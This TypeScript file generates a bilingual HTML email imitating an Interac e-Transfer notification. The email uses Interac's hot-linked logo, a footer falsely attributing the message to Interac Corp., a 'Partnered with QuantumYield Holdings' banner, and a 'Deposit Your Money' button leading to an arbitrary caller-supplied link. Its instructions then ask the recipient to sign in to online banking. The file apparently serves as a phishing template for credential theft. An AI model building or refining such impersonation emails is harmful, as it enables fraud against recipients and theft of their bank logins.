interface EmailData {
  recipientName: string
  amount: number
  message?: string
  securityQuestion: string
  transferId: string
  depositLink: string
  senderName?: string
  institution?: string
}

export function generateInteracEmailHtml(data: EmailData): string {
  const {
    recipientName,
    amount,
    message,
    securityQuestion,
    transferId,
    depositLink,
    senderName = "Your Institution",
    institution = "Banking System",
  } = data

  const formattedAmount = amount.toFixed(2)
  const currentDate = new Date().toLocaleDateString("en-US", {
    year: "numeric",
    month: "long",
    day: "numeric",
  })

  const currentDateFr = new Date().toLocaleDateString("fr-CA", {
    year: "numeric",
    month: "long",
    day: "numeric",
  })

  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Interac e-Transfer</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #F3F3F3;
      color: #333333;
    }
    .email-container {
      max-width: 700px;
      margin: 40px auto;
      background-color: #ffffff;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
    }
    .topbar {
      background-color: #000000;
      padding: 14px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
    }
    .topbar-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .topbar img {
      height: 50px;
      display: block;
    }
    .dba {
      background-color: #000000;
      color: rgba(250, 250, 250, 0.4);
      font-weight: bold;
      font-size: 12px;
      padding: 6px 10px;
      border-radius: 4px;
      border: 1px solid rgba(250, 250, 250, 0.1);
    }
    .topbar-right {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    /* Interactive language toggle styling */
    .lang-toggle {
      display: flex;
      gap: 8px;
      align-items: center;
    }
    .lang-toggle span {
      color: #ffffff;
      font-size: 13px;
      opacity: 0.7;
      cursor: pointer;
      user-select: none;
      padding: 4px 8px;
      border-radius: 3px;
      transition: background-color 0.2s, opacity 0.2s;
    }
    .lang-toggle span:hover {
      opacity: 1;
      background-color: rgba(255, 255, 255, 0.1);
    }
    .lang-toggle span.active {
      font-weight: bold;
      text-decoration: underline;
      opacity: 1;
      background-color: #fdb913;
      color: #000000;
    }
    /* </CHANGE> */
    .brand {
      background-color: #FDB913;
      color: #000000;
      font-weight: bold;
      font-size: 16px;
      padding: 8px 12px;
      border-radius: 4px;
    }
    .content-wrapper {
      padding: 32px 24px;
    }
    /* Language section toggling */
    .lang-section {
      display: none;
    }
    .lang-section.active {
      display: block;
    }
    /* </CHANGE> */
    .greeting-section h1 {
      font-size: 24px;
      margin-bottom: 16px;
      color: #000000;
    }
    .greeting-section p {
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 12px;
    }
    .amount-box {
      background-color: #FDB913;
      padding: 16px;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      text-align: center;
      margin: 24px 0;
    }
    .details-card {
      background-color: #ffffff;
      border: 1px solid #dddddd;
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    .details-card h3 {
      font-weight: bold;
      font-size: 16px;
      margin-bottom: 16px;
      margin-top: 0;
    }
    .detail-row {
      display: flex;
      justify-content: space-between;
      padding: 12px 0;
      border-bottom: 1px solid #f0f0f0;
    }
    .detail-row:last-child {
      border-bottom: none;
    }
    .detail-label {
      font-weight: 600;
      color: #666666;
      font-size: 14px;
    }
    .detail-value {
      color: #000000;
      font-size: 14px;
      text-align: right;
    }
    .message-box {
      background-color: #f9f9f9;
      border-left: 4px solid #FDB913;
      padding: 16px;
      margin: 20px 0;
      border-radius: 4px;
    }
    .message-box strong {
      display: block;
      margin-bottom: 8px;
      color: #000000;
    }
    .security-section {
      background-color: #fff9e6;
      border: 2px solid #FDB913;
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    .security-section h4 {
      margin: 0 0 12px 0;
      font-size: 16px;
      color: #000000;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .security-toggle {
      position: relative;
    }
    .security-question-text {
      margin: 0 0 8px 0;
      font-size: 14px;
      color: #333333;
      word-break: break-word;
    }
    /* Interactive reveal button styling */
    .security-answer {
      background-color: #ffffff;
      border: 1px solid #dddddd;
      padding: 12px;
      border-radius: 4px;
      margin-top: 8px;
      font-weight: 600;
      color: #000000;
      cursor: pointer;
      user-select: none;
      transition: background-color 0.2s;
    }
    .security-answer:hover {
      background-color: #f9f9f9;
    }
    .security-answer.revealed {
      background-color: #e8f5e8;
      border-color: #4caf50;
    }
    /* </CHANGE> */
    .reveal-text {
      color: #666666;
      font-size: 13px;
      font-style: italic;
      margin-top: 4px;
    }
    .button-section {
      text-align: center;
      margin: 32px 0;
    }
    .deposit-button {
      background-color: #FDB913;
      color: #000000;
      padding: 14px 30px;
      font-weight: bold;
      text-decoration: none;
      border-radius: 6px;
      display: inline-block;
      font-size: 16px;
      transition: background-color 0.2s;
    }
    .deposit-button:hover {
      background-color: #e5a811;
    }
    .instructions {
      background-color: #f9f9f9;
      padding: 20px;
      border-radius: 8px;
      margin: 24px 0;
    }
    .instructions h4 {
      margin-top: 0;
      font-size: 16px;
    }
    .instructions ol {
      margin: 8px 0;
      padding-left: 20px;
    }
    .instructions li {
      margin: 8px 0;
      font-size: 14px;
      line-height: 1.6;
    }
    .security-notice {
      font-size: 13px;
      color: #666666;
      font-style: italic;
      text-align: center;
    }
    .footer {
      background-color: #f1f1f1;
      padding: 16px;
      font-size: 12px;
      color: #666666;
      text-align: center;
    }
    .footer a {
      color: #2563eb;
      text-decoration: none;
    }
    @media only screen and (max-width: 600px) {
      .topbar {
        padding: 12px;
      }
      .topbar-left,
      .topbar-right {
        flex-direction: column;
        align-items: flex-start;
        width: 100%;
      }
      .detail-row {
        flex-direction: column;
        gap: 4px;
      }
      .detail-value {
        text-align: left;
      }
    }
  </style>
</head>
<body>
  <div class="email-container">
    <div class="topbar">
      <div class="topbar-left">
        <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer" height="50">
        <div class="dba" data-lang-key="dba">Partnered with QuantumYield Holdings</div>
      </div>
      <div class="topbar-right">
        <div class="lang-toggle">
          <span class="active" data-lang="en">EN</span>
          <span data-lang="fr">FR</span>
        </div>
        <div class="brand">e-Transfer</div>
      </div>
    </div>

    <div class="content-wrapper">
      <!-- English Content Section -->
      <div class="lang-section active" data-lang="en">
        <div class="greeting-section">
          <h1>Hi ${recipientName},</h1>
          <p>You've received a secure Interac e-Transfer.</p>

          <div class="amount-box">
            Amount: $${formattedAmount} CAD
          </div>

          <div class="details-card">
            <h3>Transfer Details</h3>
            <div class="detail-row">
              <span class="detail-label">Date:</span>
              <span class="detail-value">${currentDate}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">From:</span>
              <span class="detail-value">${institution}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Transfer ID:</span>
              <span class="detail-value">${transferId}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Amount:</span>
              <span class="detail-value">$${formattedAmount} CAD</span>
            </div>
          </div>

          ${
            message
              ? `<div class="message-box">
            <strong>Message (Optional):</strong>
            ${message}
          </div>`
              : ""
          }

          <div class="security-section">
            <h4>
              <span>🔒</span>
              <span>Security Question</span>
            </h4>
            <div class="security-toggle">
              <p class="security-question-text">${securityQuestion}</p>
              <div class="security-answer" data-revealed="false">
                Answer: ****** (click to reveal example)
              </div>
              <p class="reveal-text">
                You'll need to answer this security question when depositing your funds through your financial institution.
              </p>
            </div>
          </div>

          <div class="button-section">
            <a href="${depositLink}" class="deposit-button">Deposit Your Money</a>
          </div>

          <div class="instructions">
            <h4>How to deposit:</h4>
            <ol>
              <li>Click the "Deposit Your Money" button above.</li>
              <li>Select your financial institution.</li>
              <li>Sign in to your online banking.</li>
              <li>Answer the security question.</li>
              <li>Choose which account to deposit the money into.</li>
            </ol>
          </div>

          <p class="security-notice">
            This is a secure transaction. For your security, please do not forward this email as it contains confidential information meant only for you.
          </p>
        </div>
      </div>
      <!-- </CHANGE> -->

      <!-- French Content Section -->
      <div class="lang-section" data-lang="fr">
        <div class="greeting-section">
          <h1>Bonjour ${recipientName},</h1>
          <p>Vous avez reçu un virement Interac sécurisé.</p>

          <div class="amount-box">
            Montant : ${formattedAmount} $ CAD
          </div>

          <div class="details-card">
            <h3>Détails du virement</h3>
            <div class="detail-row">
              <span class="detail-label">Date :</span>
              <span class="detail-value">${currentDateFr}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">De :</span>
              <span class="detail-value">${institution}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">ID du virement :</span>
              <span class="detail-value">${transferId}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Montant :</span>
              <span class="detail-value">${formattedAmount} $ CAD</span>
            </div>
          </div>

          ${
            message
              ? `<div class="message-box">
            <strong>Message (facultatif) :</strong>
            ${message}
          </div>`
              : ""
          }

          <div class="security-section">
            <h4>
              <span>🔒</span>
              <span>Question de sécurité</span>
            </h4>
            <div class="security-toggle">
              <p class="security-question-text">${securityQuestion}</p>
              <div class="security-answer" data-revealed="false">
                Réponse : ****** (cliquez pour révéler l'exemple)
              </div>
              <p class="reveal-text">
                Vous devrez répondre à cette question de sécurité lors du dépôt de vos fonds via votre institution financière.
              </p>
            </div>
          </div>

          <div class="button-section">
            <a href="${depositLink}" class="deposit-button">Déposer votre argent</a>
          </div>

          <div class="instructions">
            <h4>Comment déposer :</h4>
            <ol>
              <li>Cliquez sur le bouton « Déposer votre argent » ci-dessus.</li>
              <li>Sélectionnez votre institution financière.</li>
              <li>Connectez-vous à votre banque en ligne.</li>
              <li>Répondez à la question de sécurité.</li>
              <li>Choisissez le compte dans lequel déposer l'argent.</li>
            </ol>
          </div>

          <p class="security-notice">
            Ceci est une transaction sécurisée. Pour votre sécurité, veuillez ne pas transférer cet courriel car il contient des informations confidentielles destinées uniquement à vous.
          </p>
        </div>
      </div>
      <!-- </CHANGE> -->
    </div>

    <div class="footer">
      <p>© 2025 Interac Corp. This email was sent to you by Interac Corp., the owner of the Interac e-Transfer service, on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
      <p style="margin-top: 8px;">
        <a href="https://www.interac.ca/en/interac-e-transfer-terms-of-use/">Terms of Use</a>
      </p>
      <p style="margin-top: 8px;">This is an automated email. Please do not reply to this message.</p>
    </div>
  </div>

  <!-- JavaScript for language toggle and security reveal -->
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const langToggles = document.querySelectorAll('.lang-toggle span[data-lang]');
      const langSections = document.querySelectorAll('.lang-section[data-lang]');
      const html = document.documentElement;

      langToggles.forEach(toggle => {
        toggle.addEventListener('click', function() {
          const selectedLang = this.getAttribute('data-lang');

          langToggles.forEach(t => t.classList.remove('active'));
          this.classList.add('active');

          html.setAttribute('lang', selectedLang);

          langSections.forEach(section => {
            if (section.getAttribute('data-lang') === selectedLang) {
              section.classList.add('active');
            } else {
              section.classList.remove('active');
            }
          });

          const dba = document.querySelector('.dba');
          if (selectedLang === 'fr') {
            dba.textContent = 'Partenaire de QuantumYield Holdings';
          } else {
            dba.textContent = 'Partnered with QuantumYield Holdings';
          }
        });
      });

      const securityAnswers = document.querySelectorAll('.security-answer');
      securityAnswers.forEach(answer => {
        answer.addEventListener('click', function() {
          const lang = this.closest('.lang-section').getAttribute('data-lang');
          if (this.getAttribute('data-revealed') === 'false') {
            if (lang === 'fr') {
              this.textContent = 'Réponse : ExempleMotDePasse (révélé)';
            } else {
              this.textContent = 'Answer: ExampleSecretPass (revealed)';
            }
            this.setAttribute('data-revealed', 'true');
            this.classList.add('revealed');
          }
        });
      });
    });
  </script>
  <!-- </CHANGE> -->
</body>
</html>
`
}

export type EmailLang = "en" | "fr"
export type EmailLangMode = EmailLang | "dual"

export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"): string {
  return generateInteracEmailHtml(data)
}
